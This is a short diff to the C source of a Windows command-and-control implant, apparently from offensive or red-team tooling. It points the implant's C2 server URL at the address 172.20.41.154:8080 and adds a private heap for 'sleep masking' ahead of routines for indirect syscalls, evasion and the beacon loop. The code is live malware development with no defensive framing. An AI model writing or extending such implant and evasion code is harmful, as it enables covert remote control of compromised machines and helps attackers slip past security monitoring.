@@ -29,7 +29,7 @@ static const DWORD g_dwServerPubKeyDerLen = 294;
 // =============================================
 // CONFIGURATION — Edit these before building
 // =============================================
-#define C2_SERVER_URL   "http://127.0.0.1:8080"
+#define C2_SERVER_URL   "http://172.20.41.154:8080"
 #define C2_SLEEP_MS     10000
 #define C2_JITTER_PCT   20
 #define C2_KILL_DATE    ""
@@ -163,6 +163,7 @@ int main(int argc, char* argv[]) {
         printf("  [*] Server: %s\n", C2_SERVER_URL);
         printf("============================================\n\n");
         InitializeNtSyscalls();
+        ImplantHeapInit();
         IMPLANT_CONFIG config; BuildConfig(&config);
         ImplantMain(&config);
         return 0;
@@ -196,7 +197,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // Step 1: Initialize indirect syscalls
     InitializeNtSyscalls();
 
-    // Step 2: Run evasion before anything else
+    // Step 2: Initialize private heap for sleep masking
+    ImplantHeapInit();
+
+    // Step 3: Run evasion before anything else
     RunAllEvasion();
 
     // Step 3: Enter C2 loop
